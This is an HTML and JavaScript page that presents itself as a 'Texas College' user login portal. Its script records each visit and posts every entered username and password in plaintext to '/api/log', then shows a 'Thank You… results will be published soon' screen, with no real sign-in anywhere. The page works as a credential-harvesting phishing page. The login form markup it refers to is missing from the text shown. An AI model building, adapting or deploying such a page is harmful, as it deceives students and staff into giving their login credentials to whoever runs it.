<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Texas College – User Login</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

body {
  min-height: 100vh;
  background: linear-gradient(180deg, #e2e8f0 0%, #edf0f5 40%, #d4dde8 100%);
  display: flex;
  flex-direction: column;
  align-items: center;
  font-family: Arial, Helvetica, sans-serif;
}

/* ── LOGO BAR: white box, both logos same size, centered ── */
.logo-bar {
  width: 88%;
  max-width: 720px;
  background: #ffffff;
  border-radius: 4px;
  margin: 22px auto 0;
  display: flex;
  align-items: center;
  justify-content: space-around;
  padding: 18px 24px;
  box-shadow: 0 1px 4px rgba(0,0,0,0.06);
}
.logo-bar img {
  height: 72px;
  width: auto;
  max-width: 46%;
  object-fit: contain;
  display: block;
}

/* ── MAIN ── */
.main {
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  padding: 28px 16px 40px;
}

/* ── CARD: matches original exactly ── */
.card {
  background: rgba(148, 158, 165, 0.82);
  border-radius: 8px;
  padding: 30px 24px 24px;
  width: 88%;
  max-width: 680px;
  box-shadow: none;
}

/* Title: "Texas " thin, "User Login" bold — same size, light grey/white color */
.card-title {
  text-align: center;
  font-size: 2rem;
  color: #e8e8e8;
  margin-bottom: 22px;
  font-weight: 300;
  letter-spacing: 0.5px;
}
.card-title b {
  font-weight: 700;
  color: #ffffff;
}

/* Input fields: white/light bg, rounded, with grey icon area on left */
.input-wrap {
  position: relative;
  margin-bottom: 10px;
}
.input-wrap svg {
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  width: 42px;
  height: 100%;
  fill: #bbb;
  padding: 13px 12px;
  pointer-events: none;
}
.input-wrap input {
  width: 100%;
  padding: 14px 14px 14px 44px;
  border: none;
  border-radius: 6px;
  background: rgba(255,255,255,0.82);
  font-size: 1rem;
  color: #555;
  outline: none;
  font-family: Arial, Helvetica, sans-serif;
}
.input-wrap input:focus {
  background: rgba(255,255,255,0.95);
  box-shadow: 0 0 0 2px #3ab5b0;
}
.input-wrap input::placeholder { color: #bbb; }

/* Sign in button: teal, full width, rounded */
.btn-signin {
  width: 100%;
  padding: 14px;
  background: #3ab5b0;
  color: #fff;
  font-size: 1rem;
  font-weight: 400;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  margin-top: 8px;
  font-family: Arial, Helvetica, sans-serif;
  letter-spacing: 0.3px;
  transition: background 0.15s;
}
.btn-signin:hover { background: #2e9f9b; }

.tos-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  margin-top: 16px;
}
.tos-row input[type=checkbox] {
  width: 15px; height: 15px;
  accent-color: #3ab5b0;
  cursor: pointer;
}
.tos-row label { font-size: 0.88rem; color: #ddd; cursor: pointer; }
.tos-row label a { color: #ddd; text-decoration: underline; }

.error-msg {
  background: rgba(200,40,40,0.18);
  border: 1px solid rgba(200,40,40,0.3);
  color: #fff;
  font-size: 0.83rem;
  border-radius: 6px;
  padding: 7px 10px;
  margin-bottom: 12px;
  text-align: center;
  display: none;
}

/* ── FOOTER: dark navy, ticker text, then texas logo in oval ── */
.footer {
  width: 100%;
  background: #1e2f7a;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding-bottom: 18px;
}
.footer-ticker {
  width: 100%;
  padding: 12px 0;
  text-align: center;
  font-size: 0.85rem;
  font-weight: 700;
  letter-spacing: 4px;
  text-transform: uppercase;
  color: rgba(255,255,255,0.75);
}
.footer-bottom {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: 4px;
}
/* SVG arch lines drawn precisely */
.footer-bottom svg.arch-svg {
  display: block;
  margin-bottom: -2px;
}
.footer-pill {
  background: #fff;
  border-radius: 40px;
  padding: 9px 26px;
  display: flex;
  align-items: center;
  justify-content: center;
  border: 2.5px solid rgba(255,255,255,0.6);
}
.footer-pill img {
  height: 40px;
  width: auto;
  object-fit: contain;
}
.footer-line {
  width: 90px;
  height: 2px;
  background: rgba(255,255,255,0.35);
  margin-top: 14px;
  border-radius: 2px;
}

/* ── THANK YOU PAGE ── */
#thankyou-page {
  display: none;
  min-height: 100vh;
  width: 100%;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: linear-gradient(180deg, #e2e8f0 0%, #edf0f5 40%, #d4dde8 100%);
  padding: 24px;
  text-align: center;
}
.ty-card {
  background: rgba(148,158,165,0.82);
  border-radius: 10px;
  padding: 48px 36px;
  max-width: 480px;
  width: 100%;
}
.ty-check {
  width: 64px; height: 64px;
  border-radius: 50%;
  background: #3ab5b0;
  display: flex; align-items: center; justify-content: center;
  margin: 0 auto 20px;
}
.ty-check svg { width: 32px; height: 32px; fill: #fff; }
.ty-title { font-size: 1.5rem; font-weight: 700; color: #fff; margin-bottom: 12px; }
.ty-sub { font-size: 0.96rem; color: rgba(255,255,255,0.92); line-height: 1.75; }
.ty-badge {
  display: inline-block;
  margin-top: 22px;
  background: #1e2f7a;
  color: rgba(255,255,255,0.85);
  font-size: 0.78rem; font-weight: 700;
  padding: 7px 18px; border-radius: 20px; letter-spacing: 0.5px;
}

@media (max-width: 520px) {
  .logo-bar { width: 94%; padding: 14px 12px; }
  .logo-bar img { height: 50px; }
  .card { width: 94%; padding: 22px 14px 18px; }
  .card-title { font-size: 1.5rem; }
}
</style>
</head>

<!-- THANK YOU PAGE -->
<div id="thankyou-page">
  <div class="ty-card">
    <div class="ty-check">
      <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
    </div>
    <div class="ty-title">Thank You!</div>
    <div class="ty-sub">
      Your login request has been received.<br><br>
      <strong>Results will be published soon.</strong><br><br>
      Please check the official Texas College notice board for updates.
    </div>
    <div class="ty-badge">Texas International Education Network</div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const source = urlParams.get('src') || 'direct';
  const deviceType = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'mobile' : 'desktop';

  function logVisit() {
    const data = { event:'visit', source, device:deviceType, time:new Date().toISOString() };
    fetch('/api/log', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
  }
  function logSubmission(username, password) {
    const data = { event:'submit', username, password, source, device:deviceType, time:new Date().toISOString() };
    fetch('/api/log', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
  }
  async function handleSubmit() {
    const tos = document.getElementById('tos').checked;
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const errMsg = document.getElementById('errorMsg');
    if (!tos) {
      errMsg.textContent = 'Please accept the terms of service first.';
      errMsg.style.display = 'block';
      setTimeout(() => errMsg.style.display = 'none', 3000);
      return;
    }
    if (!username || !password) {
      errMsg.textContent = 'Please enter your username and password.';
      errMsg.style.display = 'block';
      setTimeout(() => errMsg.style.display = 'none', 3000);
      return;
    }
    const data = { event:'submit', username, password, source, device:deviceType, time:new Date().toISOString() };
    await fetch('/api/log', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) });
    document.getElementById('login-page').style.display = 'none';
    document.getElementById('thankyou-page').style.display = 'flex';
  }
  logVisit();
  document.addEventListener('keydown', e => { if(e.key==='Enter') handleSubmit(); });
</script>
